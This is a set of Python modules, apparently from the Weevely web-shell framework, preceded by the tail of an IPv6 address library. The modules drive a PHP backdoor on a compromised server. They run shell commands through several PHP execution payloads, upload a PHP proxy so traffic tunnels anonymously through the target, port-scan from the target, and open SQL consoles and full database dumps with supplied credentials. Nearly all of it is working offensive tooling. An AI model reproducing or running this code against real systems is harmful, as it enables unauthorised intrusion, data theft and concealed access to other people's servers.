            return

        # Constructing from a packed address
        if isinstance(address, Bytes):
            try:
                hi, lo = struct.unpack('!QQ', address)
            except struct.error:
                raise AddressValueError(address)  # Wrong length.
            self._ip = (hi << 64) | lo
            return

        # Assume input argument to be string or any object representation
        # which converts into a formatted IP string.
        addr_str = str(address)
        if not addr_str:
            raise AddressValueError('')

        self._ip = self._ip_int_from_string(addr_str)


class IPv6Network(_BaseV6, _BaseNet):

    """This class represents and manipulates 128-bit IPv6 networks.

    Attributes: [examples for IPv6('2001:658:22A:CAFE:200::1/64')]
        .ip: IPv6Address('2001:658:22a:cafe:200::1')
        .network: IPv6Address('2001:658:22a:cafe::')
        .hostmask: IPv6Address('::ffff:ffff:ffff:ffff')
        .broadcast: IPv6Address('2001:658:22a:cafe:ffff:ffff:ffff:ffff')
        .netmask: IPv6Address('ffff:ffff:ffff:ffff::')
        .prefixlen: 64

    """


    def __init__(self, address, strict=False):
        """Instantiate a new IPv6 Network object.

        Args:
            address: A string or integer representing the IPv6 network or the IP
              and prefix/netmask.
              '2001:4860::/128'
              '2001:4860:0000:0000:0000:0000:0000:0000/128'
              '2001:4860::'
              are all functionally the same in IPv6.  That is to say,
              failing to provide a subnetmask will create an object with
              a mask of /128.

              Additionally, an integer can be passed, so
              IPv6Network('2001:4860::') ==
                IPv6Network(42541956101370907050197289607612071936L).
              or, more generally
              IPv6Network(IPv6Network('2001:4860::')._ip) ==
                IPv6Network('2001:4860::')

            strict: A boolean. If true, ensure that we have been passed
              A true network address, eg, 192.168.1.0/24 and not an
              IP address on a network, eg, 192.168.1.1/24.

        Raises:
            AddressValueError: If address isn't a valid IPv6 address.
            NetmaskValueError: If the netmask isn't valid for
              an IPv6 address.
            ValueError: If strict was True and a network address was not
              supplied.

        """
        _BaseNet.__init__(self, address)
        _BaseV6.__init__(self, address)

        # Constructing from an integer or packed bytes.
        if isinstance(address, (int, long, Bytes)):
            self.ip = IPv6Address(address)
            self._ip = self.ip._ip
            self._prefixlen = self._max_prefixlen
            self.netmask = IPv6Address(self._ALL_ONES)
            return

        # Assume input argument to be string or any object representation
        # which converts into a formatted IP prefix string.
        addr = str(address).split('/')

        if len(addr) > 2:
            raise AddressValueError(address)

        self._ip = self._ip_int_from_string(addr[0])
        self.ip = IPv6Address(self._ip)

        if len(addr) == 2:
            if self._is_valid_netmask(addr[1]):
                self._prefixlen = int(addr[1])
            else:
                raise NetmaskValueError(addr[1])
        else:
            self._prefixlen = self._max_prefixlen

        self.netmask = IPv6Address(self._ip_int_from_prefix(self._prefixlen))

        if strict:
            if self.ip != self.network:
                raise ValueError('%s has host bits set' %
                                 self.ip)
        if self._prefixlen == (self._max_prefixlen - 1):
            self.iterhosts = self.__iter__

    def _is_valid_netmask(self, prefixlen):
        """Verify that the netmask/prefixlen is valid.

        Args:
            prefixlen: A string, the netmask in prefix length format.

        Returns:
            A boolean, True if the prefix represents a valid IPv6
            netmask.

        """
        try:
            prefixlen = int(prefixlen)
        except ValueError:
            return False
        return 0 <= prefixlen <= self._max_prefixlen

    @property
    def with_netmask(self):
        return self.with_prefixlen

########NEW FILE########
__FILENAME__ = local_proxy
import SocketServer
import urllib
from thread import start_new_thread
from sys import argv, exit
import re

class ProxyHandler(SocketServer.StreamRequestHandler):

    def __init__(self, request, client_address, server):

        self.proxies = {}
        self.useragent = server.agent
        self.phpproxy = server.rurl

        try:
            SocketServer.StreamRequestHandler.__init__(self, request, client_address,server)
        except Exception, e:
            raise


    def handle(self):
        req, body, cl, req_len, read_len = '', 0, 0, 0, 4096
        try:
            while 1:
                if not body:
                    line = self.rfile.readline(read_len)
                    if line == '':
                        # send it anyway..
                        self.send_req(req)
                        return
                    #if line[0:17].lower() == 'proxy-connection:':
                    #    req += "Connection: close\r\n"
                    #    continue
                    req += line
                    if not cl:
                        t = re.compile('^Content-Length: (\d+)', re.I).search(line)
                        if t is not None:
                            cl = int(t.group(1))
                            continue
                    if line == "\015\012" or line == "\012":
                        if not cl:
                            self.send_req(req)
                            return
                        else:
                            body = 1
                            read_len = cl
                else:
                    buf = self.rfile.read(read_len)
                    req += buf
                    req_len += len(buf)
                    read_len = cl - req_len
                    if req_len >= cl:
                        self.send_req(req)
                        return
        except Exception, e:
            raise

    def send_req(self, req):
        #print req
        if req == '':
            return
        ua = urllib.FancyURLopener(self.proxies)
        ua.addheaders = [('User-Agent', self.useragent)]
        r = ua.open(self.phpproxy, urllib.urlencode({'req': req}))
        while 1:
            c = r.read(2048)
            if c == '': break
            self.wfile.write(c)
        self.wfile.close()
        
        
if __name__ == "__main__":
    
    if len(argv) < 5:
        print '[!] Usage: ./local_proxy.py <localhost> <localport> <rurl> <useragent>'
        exit(1)
        
    lhost = argv[1]
    lport = int(argv[2])
    rurl = argv[3]
    agent = argv[4]
    
    SocketServer.TCPServer.allow_reuse_address = True
    server = SocketServer.ThreadingTCPServer((lhost, lport), ProxyHandler)
    server.rurl = rurl
    server.agent = agent
    server.serve_forever()

########NEW FILE########
__FILENAME__ = ifaces

from core.module import Module
from core.moduleexception import ModuleException, ProbeException
from core.argparse import ArgumentParser
from external.ipaddr import IPNetwork
import re

WARN_NO_OUTPUT = 'No execution output'
WARN_NO_IFACES = 'No interfaces address found'

class Ifaces(Module):
    '''Print interfaces addresses'''
    
    
    def _set_vectors(self):
        self.support_vectors.add_vector('enum',  'file.enum',  ["asd", "-pathlist", "$pathlist"])
        self.support_vectors.add_vector(  "ifconfig" , 'shell.sh', "$ifconfig_path")
    
    
    def _probe(self):
        
        self._result = {}
        
        enum_pathlist = str([ x + 'ifconfig' for x in ['/sbin/', '/bin/', '/usr/bin/', '/usr/sbin/', '/usr/local/bin/', '/usr/local/sbin/'] ])

        ifconfig_pathlist = self.support_vectors.get('enum').execute({'pathlist' : enum_pathlist })
        
        for path in ifconfig_pathlist:
            if ifconfig_pathlist[path] != ['','','','']:
                result = self.support_vectors.get('ifconfig').execute({'ifconfig_path' : path })
                
                if result:
                    ifaces = re.findall(r'^(\S+).*?inet addr:(\S+).*?Mask:(\S+)', result, re.S | re.M)

                    if ifaces:
                        
                        for iface in ifaces:
                            ipnet = IPNetwork('%s/%s' % (iface[1], iface[2]))
                            self._result[iface[0]] = ipnet
                else:
                    raise ProbeException(self.name, '\'%s\' %s' % (path, WARN_NO_OUTPUT))      
                
                
    def _verify(self):
        if not self._result:
            raise ProbeException(self.name, WARN_NO_IFACES)    
                
                     
########NEW FILE########
__FILENAME__ = phpproxy
from modules.file.upload2web import Upload2web
from modules.file.upload import WARN_NO_SUCH_FILE
from core.moduleexception import ModuleException, ProbeException
from core.argparse import ArgumentParser
from core.argparse import SUPPRESS
import re, os
from core.utils import randstr

class Phpproxy(Upload2web):
    '''Install remote PHP proxy'''

    def _set_args(self):
        self.argparser.add_argument('rpath', help='Optional, upload as rpath', nargs='?')
        
        self.argparser.add_argument('-startpath', help='Upload in first writable subdirectory', metavar='STARTPATH', default='.')
        self.argparser.add_argument('-chunksize', type=int, default=1024, help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys(), help=SUPPRESS)
        self.argparser.add_argument('-force', action='store_true')


    def _get_proxy_path(self):
        return os.path.join(self.modhandler.modules_path, 'net', 'external', 'phpproxy.php')
    
    def _prepare(self):

        proxy_path = self._get_proxy_path()

        if not self.args['rpath']:
            
            # If no rpath, set content and remote final filename as random
            try:
                content = open(proxy_path, 'r').read()
            except Exception, e:
                raise ProbeException(self.name,  '\'%s\' %s' % (self.args['lpath'], WARN_NO_SUCH_FILE))

            self.args['lpath'] = randstr(4) + '.php'
            self.args['content'] = content
            
        else:
            
            # Else, set lpath as proxy filename
            
            self.args['lpath'] = proxy_path
            self.args['content'] = None
    
    
        Upload2web._prepare(self)
    
    
    def _stringify_result(self):

        Upload2web._stringify_result(self)

        sess_filename = os.path.join(*(self.args['rpath'].split('/')[:-1] + [ 'sess_*']))
        
        self._output = """Php proxy installed, point your browser to %s?u=http://www.google.com .
Delete '%s' and '%s' at session end.""" % ( self.args['url'], self.args['rpath'], sess_filename )

        
        
            
        
########NEW FILE########
__FILENAME__ = proxy
from modules.file.upload2web import Upload2web
from modules.net.phpproxy import Phpproxy
from core.moduleexception import ProbeSucceed, ProbeException
from core.argparse import ArgumentParser
from core.argparse import SUPPRESS
from os import path
from random import choice
from core.http.request import agent
from core.utils import url_validator
from subprocess import Popen
from sys import executable

WARN_NOT_URL = 'Not a valid URL'


class Proxy(Phpproxy):
    '''Install and run Proxy to tunnel traffic through target'''

    
    def _set_args(self):
        self.argparser.add_argument('rpath', help='Optional, upload as rpath', nargs='?')
        
        self.argparser.add_argument('-startpath', help='Upload in first writable subdirectory', metavar='STARTPATH', default='.')
        self.argparser.add_argument('-force', action='store_true')
        self.argparser.add_argument('-just-run', metavar='URL')
        self.argparser.add_argument('-just-install', action='store_true')
        self.argparser.add_argument('-lhost', default='127.0.0.1')
        self.argparser.add_argument('-lport', default='8081', type=int)
    
        self.argparser.add_argument('-chunksize', type=int, default=1024, help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys(), help=SUPPRESS)


    def _get_proxy_path(self):
        return path.join(self.modhandler.modules_path, 'net', 'external', 'proxy.php')

    def _get_local_proxy_path(self):
        return path.join(self.modhandler.modules_path, 'net', 'external', 'local_proxy.py')

    def _prepare(self):
        
        if not self.args['just_run']:
            Phpproxy._prepare(self)
        else:
            if not url_validator.match(self.args['just_run']):
                raise ProbeException(self.name, '\'%s\': %s' % (self.args['just_run'], WARN_NOT_URL) )
            
            self.args['url'] = self.args['just_run']
            self.args['rpath'] = ''

    def _probe(self):
        if not self.args['just_run']:
            try:
                Phpproxy._probe(self)
            except ProbeSucceed:
                pass
            
        if not self.args['just_install']:
            self.pid = Popen([executable, self._get_local_proxy_path(), self.args['lhost'], str(self.args['lport']), self.args['url'], agent]).pid
            
    def _verify(self):
        if not self.args['just_run']:
            Phpproxy._verify(self)   
        else:
            # With just_run, suppose good result to correctly print output
            self._result = True
    
    def _stringify_result(self):
    
        Phpproxy._stringify_result(self)
        
        rpath = ' '
        if self.args['rpath']:
            rpath = '\'%s\' ' % self.args['rpath']
        
        self._result.append(self.pid)
        
        self._output = """Proxy daemon spawned, set \'http://%s:%i\' as HTTP proxy to start browsing anonymously through target.
Run ":net.proxy -just-run '%s'" to respawn local proxy daemon without reinstalling remote agent.
When not needed anymore, remove remote file with ":file.rm %s" and run locally 'kill -9 %i' to stop proxy.""" % (self.args['lhost'], self.args['lport'], self.args['url'], rpath, self.pid)

        
        
            
        
########NEW FILE########
__FILENAME__ = scan

from core.module import Module
from core.moduleexception import ModuleException, ProbeException
from core.argparse import ArgumentParser
from external.ipaddr import IPNetwork
import re, os
from core.argparse import SUPPRESS
from core.utils import randstr
from base64 import b64encode

WARN_NO_SUCH_FILE = 'No such file or permission denied'
WARN_INVALID_SCAN = 'Invalid scan range, check syntax'

class Scan(Module):
    '''Port scan open TCP ports'''
    
    def _set_vectors(self):
        self.support_vectors.add_vector('ifaces', 'net.ifaces', [])
        self.support_vectors.add_vector( 'scan', 'shell.php',["""$str = base64_decode($_POST["$post_field"]);
    foreach (explode(',', $str) as $s) {
    $s2 = explode(' ', $s);
    foreach( explode('|', $s2[1]) as $p) {
    if($fp = fsockopen("$s2[0]", $p, $n, $e, $timeout=1)) {print(" $s2[0]:$p"); fclose($fp);}
    }print(".");}""", "-post", "{\'$post_field\' : \'$data\' }"])
    
    
    def _set_args(self):
        self.argparser.add_argument('addr', help='Single IP, multiple: IP1,IP2,.., networks IP/MASK or firstIP-lastIP, interfaces (ethN)')
        self.argparser.add_argument('port', help='Single post, multiple: PORT1,PORT2,.. or firstPORT-lastPORT')
        self.argparser.add_argument('-unknown', help='Scan also unknown ports', action='store_true')
        self.argparser.add_argument('-ppr', help=SUPPRESS, default=10, type=int)


    def _get_service_path(self):
        return os.path.join(self.modhandler.path_modules, 'net', 'external', 'nmap-services-tcp.txt')
    
    
    
    def _prepare(self):
        
        services_path = self._get_service_path()
        try:
            services = open(services_path, 'r').read()
        except Exception, e:
            raise ProbeException(self.name,  '\'%s\' %s' % (services_path, WARN_NO_SUCH_FILE))

        ifaces_all = self.support_vectors.get('ifaces').execute()

        reqlist = RequestList(self.modhandler, services, ifaces_all)
        reqlist.add(self.args['addr'], self.args['port'])

        if not reqlist:
            raise ProbeException(self.name,  WARN_INVALID_SCAN)
        
        if self.args['ppr'] == 10 and self.args['addr'] == '127.0.0.1':
            self.args['ppr'] = 100
        
        self.args['reqs'] = reqlist

    def _probe(self):
        
        while self.args['reqs']:

            reqstringarray = ''

            requests = self.args['reqs'].get_requests(self.args['ppr'])

            for host, ports in requests.items():
                portschunk = map(str, (ports))
                reqstringarray += '%s %s,' % (host, '|'.join(portschunk))
            
            output = 'SCAN %s:%s-%s ' % (host, portschunk[0], portschunk[-1])
            result = self.support_vectors.get('scan').execute({'post_field' : randstr(), 'data' : b64encode('%s' % reqstringarray[:-1])})
            if result != '.': 
                output += 'OPEN: ' + result.strip()[:-1]
                self._result += result.strip()[:-1]
            
            print output
            
    def _stringify_result(self):
        self._output = ''

class RequestList(dict):


    def __init__(self, modhandler, nmap_file, ifaces):

        self.modhandler = modhandler

        self.port_list = []
        self.ifaces = ifaces

        self.nmap_ports = []
        self.nmap_services = {}

        for line in nmap_file.splitlines():
            name, port = line.split()
            self.nmap_services[int(port)] = name
            self.nmap_ports.append(int(port))

        dict.__init__(self)


    def get_requests(self, howmany):

        to_return = {}
        requests = 0

        # Filling request

        for ip in self:
            while self[ip]:
                if requests >= howmany:
                    break

                if ip not in to_return:
                    to_return[ip] = []

                to_return[ip].append(self[ip].pop(0))

                requests+=1

            if requests >= howmany:
                break


        # Removing empty ips
        for ip, ports in self.items():
            if not ports:
                del self[ip]

        return to_return


    def add(self, net, port):
        """ First add port to duplicate for every inserted host """


        if ',' in port:
            port_ranges = port.split(',')
        else:
            port_ranges = [ port ]

        for ports in port_ranges:
            self.__set_port_ranges(ports)


        # If there are available ports
        if self.port_list:

            if ',' in net:
                addresses = net.split(',')
            else:
                addresses = [ net ]

            for addr in addresses:
                self.__set_networks(addr)

    def __set_port_ranges(self, given_range):

            start_port = None
            end_port = None


            if given_range.count('-') == 1:
                try:
                    splitted_ports = [ int(strport) for strport in given_range.split('-') if (int(strport) > 0 and int(strport) <= 65535)]
                except ValueError:
                    return None
                else:
                    if len(splitted_ports) == 2:
                        start_port = splitted_ports[0]
                        end_port = splitted_ports[1]

            else:
                try:
                    int_port = int(given_range)
                except ValueError:
                    return None
                else:
                    start_port = int_port
                    end_port = int_port

            if start_port and end_port:
                self.port_list += [ p for p in range(start_port, end_port+1) if p in self.nmap_ports]
            else:
                raise ModuleException('net.scan', 'Error parsing port numbers \'%s\'' % given_range)



    def __get_network_from_ifaces(self, iface):

        if iface in self.ifaces.keys():
             return self.ifaces[iface]




    def __set_networks(self, addr):


        networks = []

        try:
            # Parse single IP or networks
            networks.append(IPNetwork(addr))
        except ValueError:

            #Parse IP-IP
            if addr.count('-') == 1:
                splitted_addr = addr.split('-')
                # Only address supported

                try:
                    start_address = IPAddress(splitted_addr[0])
                    end_address = IPAddress(splitted_addr[1])
                except ValueError:
                    pass
                else:
                    networks += summarize_address_range(start_address, end_address)
            else:

                # Parse interface name
                remote_iface = self.__get_network_from_ifaces(addr)
                if remote_iface:
                    networks.append(remote_iface)
                else:
                    # Try to resolve host
                    try:
                        networks.append(IPNetwork(gethostbyname(addr)))
                    except:
                        pass

        if not networks:
            print '[net.scan] Warning: \'%s\' is not an IP address, network or detected interface' % ( addr)

        else:
            for net in networks:
                for ip in net:
                    self[str(ip)] = self.port_list[:]

########NEW FILE########
__FILENAME__ = php
'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module
from core.moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
from core.http.cmdrequest import CmdRequest, NoDataException
from core.argparse import ArgumentParser, StoredNamespace
from core.argparse import SUPPRESS
from ast import literal_eval

import random, os, shlex, types


WARN_PROXY = 'Proxies can break weevely requests, use proxychains'
WARN_TRAILING_SEMICOLON = 'command does not have trailing semicolon'
WARN_NO_RESPONSE = 'No response'
WARN_UNREACHABLE = 'URL or proxy unreachable'
WARN_CONN_ERR = 'Error connecting to backdoor URL or proxy'
WARN_INVALID_RESPONSE = 'skipping invalid response'
WARN_PHP_INTERPRETER_FAIL = 'PHP and Shell interpreters load failed'
MSG_PHP_INTERPRETER_SUCCEED = 'PHP and Shell interpreters load succeed'

class Php(Module):
    '''Execute PHP statement'''

    mode_choices = ['Cookie', 'Referer' ]

    def _init_stored_args(self):
        self.stored_args_namespace = StoredNamespace()
        self.stored_args_namespace['mode'] = None
        self.stored_args_namespace['path'] = ''

    
    def _set_args(self):
        self.argparser.add_argument('cmd', help='PHP command enclosed with brackets and terminated by semi-comma', nargs='+' )
        self.argparser.add_argument('-mode', help='Obfuscation mode', choices = self.mode_choices)
        self.argparser.add_argument('-proxy', help='HTTP proxy. Support \'http://\', \'socks5://\', \'socks4://\'')
        self.argparser.add_argument('-precmd', help='Insert string at beginning of commands', nargs='+'  )
        self.argparser.add_argument('-debug', help='Change debug class (3 or less to show request and response)', type=int, default=4, choices =range(1,5))
        self.argparser.add_argument('-post', help=SUPPRESS, type=type({}), default={})

    def _set_vectors(self):
        
        self.support_vectors.add_vector(name='ls', interpreter='file.ls', payloads = [ '$rpath' ])
 
    def _prepare(self):
        
        # Cases: 
        # 1. First call by terminal. No preset vector, do a slacky probe
        # 2. first call by cmdline (no vector)
        
        if not self.stored_args_namespace['mode']:
            
            first_probe = self.__slacky_probe()
            
            if first_probe:
                # If there is no command, raise ProbeSucceed and do not execute the command
                self.stored_args_namespace['mode'] = first_probe
                
                if self.args['cmd'][0] == ' ':
                    raise ProbeSucceed(self.name, MSG_PHP_INTERPRETER_SUCCEED)

        if self.args['cmd'][0] != ' ' and self.stored_args_namespace['mode'] in self.mode_choices:        
                    
            # Check if is raw command is not 'ls' 
            if self.args['cmd'][0][:2] != 'ls':
                    
                # Warn about not ending semicolon
                if self.args['cmd'] and self.args['cmd'][-1][-1] not in (';', '}'):
                    self.mprint('\'..%s\' %s' % (self.args['cmd'][-1], WARN_TRAILING_SEMICOLON))
              
                # Prepend chdir
                if self.stored_args_namespace['path']:
                    self.args['cmd'] = [ 'chdir(\'%s\');' % (self.stored_args_namespace['path']) ] + self.args['cmd'] 
                    
                # Prepend precmd
                if self.args['precmd']:
                    self.args['cmd'] = self.args['precmd'] + self.args['cmd']
    

    def _probe(self):
        
        
        # If 'ls', execute __ls_handler
        if self.args['cmd'][0][:2] == 'ls':
            
            rpath = ''
            if ' ' in self.args['cmd'][0]:
                rpath = self.args['cmd'][0].split(' ')[1]
                
            self._result = '\n'.join(self.support_vectors.get('ls').execute({'rpath' : rpath }))
        else:
            self._result = self.__do_request(self.args['cmd'], self.args['mode'])
        


    def __do_request(self, listcmd, mode):
        
        cmd = listcmd
        if isinstance(listcmd, types.ListType):
            cmd = ' '.join(listcmd)
        
        request = CmdRequest( self.modhandler.url, self.modhandler.password, self.args['proxy'])
        request.setPayload(cmd, mode)

        msg_class = self.args['debug']

        if self.args['post']:
            request.setPostData(self.args['post'])
            self.mprint( "Post data values:", msg_class)
            for field in self.args['post']:
                self.mprint("  %s (%i)" % (field, len(self.args['post'][field])), msg_class)

        self.mprint( "Request: %s" % (cmd), msg_class)

        try:
            response = request.execute()
        except NoDataException, e:
            raise ProbeException(self.name, WARN_NO_RESPONSE)
        except IOError, e:
            raise ProbeException(self.name, '%s. %s' % (e.strerror, WARN_UNREACHABLE))
        except Exception, e:
            raise ProbeException(self.name, '%s. %s' % (str(e), WARN_CONN_ERR))
    
        if 'eval()\'d code' in response:
            if len(response)>=100: 
                response_sum = '...' + response[-100:] 
            else: 
                response_sum = response
            
            raise ProbeException(self.name, '%s: \'%s\'' % (WARN_INVALID_RESPONSE, response_sum))
        
        self.mprint( "Response: %s" % response, msg_class)
        
        return response

    def __slacky_probe(self):
        
        for currentmode in self.mode_choices:

            rand = str(random.randint( 11111, 99999 ))

            try:
                response = self.__do_request('print(%s);' % (rand), currentmode)
            except ProbeException, e:
                self.mprint('%s with %s method' % (e.error, currentmode))
                continue
            
            if response == rand:
                return currentmode
        




########NEW FILE########
__FILENAME__ = sh
'''
Created on 22/ago/2011

@author: norby
'''
from core.moduleexception import ModuleException, ProbeException, ExecutionException, ProbeSucceed
from core.moduleguess import ModuleGuess
from core.argparse import ArgumentParser, StoredNamespace
from core.argparse import SUPPRESS
from ast import literal_eval
import random

MSG_SH_INTERPRETER_SUCCEED = 'Shell interpreter load succeed'
WARN_SH_INTERPRETER_FAIL = 'Shell interpreters load failed'

class Sh(ModuleGuess):
    '''Execute system shell command'''

    def _set_vectors(self):
        self.vectors.add_vector("system", 'shell.php', "@system('$cmd $no_stderr');")
        self.vectors.add_vector("passthru" , 'shell.php', "@passthru('$cmd $no_stderr');")
        self.vectors.add_vector("shell_exec", 'shell.php', "print(@shell_exec('$cmd $no_stderr'));")
        self.vectors.add_vector("exec", 'shell.php',  "$r=array(); @exec('$cmd $no_stderr', $r);print(join(\"\\n\",$r));")
        self.vectors.add_vector("pcntl", 'shell.php', '$p=@pcntl_fork(); if(!$p) { { @pcntl_exec( "/bin/sh", Array("-c", "$cmd")); } else { @pcntl_waitpid($p,$status); }}'),
        self.vectors.add_vector("popen", 'shell.php', "$h = @popen('$cmd','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }")
        self.vectors.add_vector("python_eval", 'shell.php', "@python_eval('import os; os.system('$cmd$no_stderr');');")
        self.vectors.add_vector("perl_system", 'shell.php', "if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('$cmd$no_stderr'); print($r); }")
        self.vectors.add_vector("proc_open", 'shell.php', """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
$h = @proc_open('$cmd', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));
while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
fclose($pipes[2]); proc_close($h); }""")
     
    def _set_args(self):
        self.argparser.add_argument('cmd', help='Shell command', nargs='+')
        self.argparser.add_argument('-no-stderr', help='Suppress error output', action='store_false')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        
    def _init_stored_args(self):
        self.stored_args_namespace = StoredNamespace()
        self.stored_args_namespace['vector'] = None 

    def _execute_vector(self):
        
        # Cases: 
        # 1. First call by terminal. No preset vector, do a slacky probe
        # 2. first call by cmdline (no vector)
        if not self.stored_args_namespace['vector']:
            if self.__slacky_probe():
                self.stored_args_namespace['vector'] = self.current_vector.name
                
                # If there is no command, raise ProbeSucceed and do not execute the command
                if self.args['cmd'] == [' ']:
                    raise ProbeSucceed(self.name, MSG_SH_INTERPRETER_SUCCEED)
         
        # Execute if is current vector is saved or choosen
        if self.args['cmd'][0] != ' ' and self.current_vector.name in (self.stored_args_namespace['vector'], self.args['vector']):
            self._result = self.current_vector.execute( self.formatted_args)
            
        
    def _prepare_vector(self):
        
        # Format cmd
        self.formatted_args['cmd'] = ' '.join(self.args['cmd']).replace( "'", "\\'" )

        # Format stderr
        if any('$no_stderr' in p for p in self.current_vector.payloads):
            if self.args['no_stderr']:
                self.formatted_args['no_stderr'] = '2>&1'
            else:
                self.formatted_args['no_stderr'] = ''
 
    def __slacky_probe(self):
        
        rand = str(random.randint( 11111, 99999 ))
        
        slacky_formats = self.formatted_args.copy()
        slacky_formats['cmd'] = 'echo %s' % (rand)
        
        if self.current_vector.execute(slacky_formats) == rand:
            return True
        






########NEW FILE########
__FILENAME__ = console
from core.module import Module
from core.moduleexception import ModuleException, ProbeException
from core.argparse import ArgumentParser, StoredNamespace
import re

WARN_NO_DATA = 'No data returned'
WARN_CHECK_CRED = 'check credentials and dbms availability'

class Console(Module):
    '''Run SQL console or execute single queries'''
    
    def _set_vectors(self):

        self.support_vectors.add_vector('mysql', 'shell.php', ["""if(mysql_connect("$host","$user","$pass")){$r=mysql_query("$query");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};mysql_close();}""" ])
        self.support_vectors.add_vector('mysql_fallback', 'shell.php', [ """$r=mysql_query("$query");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};mysql_close();"""]),
        self.support_vectors.add_vector('pg', 'shell.php', ["""if(pg_connect("host=$host user=$user password=$pass")){$r=pg_query("$query");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};pg_close();}""" ]),
        self.support_vectors.add_vector('pg_fallback', 'shell.php', ["""$r=pg_query("$query");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";} echo "\n";}};pg_close();"""])

    def _set_args(self):
        self.argparser.add_argument('-user', help='SQL username')
        self.argparser.add_argument('-pass', help='SQL password')
        self.argparser.add_argument('-host', help='DBMS host or host:port', default='127.0.0.1')
        self.argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
        self.argparser.add_argument('-query', help='Execute single query')

    def _init_stored_args(self):
        self.stored_args_namespace = StoredNamespace()
        self.stored_args_namespace['vector'] = ''
        self.stored_args_namespace['prompt'] = 'SQL> '
        


    def _prepare(self):

        self.args['vector'] = 'pg' if self.args['dbms'] == 'postgres' else 'mysql'
        if not self.args['user'] or not self.args['pass']:
            self.args['vector'] += '_fallback'
            
        

    def _probe(self):


        if not self.args['query']:
            
            self._check_credentials()
            
            while True:
                self._result = None
                self._output = ''
                
                query  = raw_input( self.stored_args_namespace['prompt'] ).strip()
                
                if not query:
                    continue
                if query == 'quit':
                    break
                
                self._result = self._query(query)
                
                if self._result == None:
                    self.mprint('%s %s' % (WARN_NO_DATA, WARN_CHECK_CRED))
                elif not self._result:
                    self.mprint(WARN_NO_DATA)
                else:   
                    self._stringify_result()
                    
                print self._output
                    
                
        else:
            self._result = self._query(self.args['query'])

            if self._result == None:
                self.mprint('%s, %s.' % (WARN_NO_DATA, WARN_CHECK_CRED))
                
    def _query(self, query):

        result = self.support_vectors.get(self.args['vector']).execute({ 'host' : self.args['host'], 'user' : self.args['user'], 'pass' : self.args['pass'], 'query' : query })
   
        if result:
            return [ line.split('\x00') for line in result[:-1].replace('\x00\n', '\n').split('\n') ]   


    def _check_credentials(self):

        get_current_user = 'SELECT USER;' if self.args['vector']== 'postgres' else 'SELECT USER();'
        
        user = self.support_vectors.get(self.args['dbms']).execute({ 'host' : self.args['host'], 'user' : self.args['user'], 'pass' : self.args['pass'], 'query' : get_current_user })
        
        if user:
            user = user[:-1]
            self.stored_args_namespace['vector'] = self.args['vector']
            self.stored_args_namespace['prompt'] = '%s SQL> ' % user
        else:
            raise ProbeException(self.name, "%s of %s " % (WARN_CHECK_CRED, self.args['host']) )

########NEW FILE########
__FILENAME__ = dump
from core.moduleguess import ModuleGuess
from core.moduleexception import ProbeException, ProbeSucceed
from core.argparse import ArgumentParser
from tempfile import mkdtemp
from os import path

mysqlphpdump = """
function dmp ($tableQ)
{
    $result = "\n-- Dumping data for table `$tableQ`\n";
    $query = mysql_query("SELECT * FROM ".$tableQ);
    $numrow = mysql_num_rows($query);
    $numfields = mysql_num_fields($query);
    print $numrow . " " . $numfields;
    if ($numrow > 0)
    {
        $result .= "INSERT INTO `".$tableQ."` (";
        $i = 0;
        for($k=0; $k<$numfields; $k++ )
        {
            $result .= "`".mysql_field_name($query, $k)."`";
            if ($k < ($numfields-1))
                $result .= ", ";
        }
        $result .= ") VALUES ";
        while ($row = mysql_fetch_row($query))
        {
            $result .= " (";
            for($j=0; $j<$numfields; $j++)
            {
                if (mysql_field_type($query, $j) == "string" ||
                    mysql_field_type($query, $j) == "timestamp" ||
                    mysql_field_type($query, $j) == "time" ||
                    mysql_field_type($query, $j) == "datetime" ||
                    mysql_field_type($query, $j) == "blob")
                {
                    $row[$j] = addslashes($row[$j]);
                    $row[$j] = ereg_replace("\n","\\n",$row[$j]);
                    $row[$j] = ereg_replace("\r","",$row[$j]);
                    $result .= "'$row[$j]'";
                }
                else if (is_null($row[$j]))
                    $result .= "NULL";
                else
                    $result .= $row[$j];
                if ( $j<($numfields-1))
                    $result .= ", ";
            }
            $result .= ")";
            $i++;
            if ($i < $numrow)
                $result .= ",";
            else
                $result .= ";";
            $result .= "\n";
        }
    }
    else
        $result .= "-- table is empty";
    return $result . "\n\n";
}
ini_set('mysql.connect_timeout',1);
$res=mysql_connect("$host", "$user", "$pass");
if(!$res) { print("-- DEFAULT\n"); }
else {
$db_name = "$db";
$db_table_name = "$table";
mysql_select_db($db_name);
$tableQ = mysql_list_tables ($db_name);
$i = 0;
$num_rows = mysql_num_rows ($tableQ);
if($num_rows) {
while ($i < $num_rows)
{
    $tb_names[$i] = mysql_tablename ($tableQ, $i);
    if(($db_table_name == $tb_names[$i]) || $db_table_name == "") {
        print(dmp($tb_names[$i]));
    }
    $i++;
}
}
mysql_close();
}"""

WARN_DUMP_ERR_SAVING = 'Can\'t save dump file'
WARN_DUMP_SAVED = 'Dump file saved'
WARN_DUMP_INCOMPLETE = 'Dump failed, saving anyway for debug purposes'
WARN_NO_DUMP = 'Dump failed, check credentials and dbms information'

class Dump(ModuleGuess):
    '''Get SQL database dump'''

    def _set_vectors(self):
        self.vectors.add_vector('mysqlphpdump', 'shell.php',  [ mysqlphpdump ] )
        self.vectors.add_vector('mysqldump', 'shell.sh', "mysqldump -h $host -u $user --password=$pass $db $table --single-transaction") 
        # --single-transaction to avoid bug http://bugs.mysql.com/bug.php?id=21527        
    
    
    def _set_args(self):
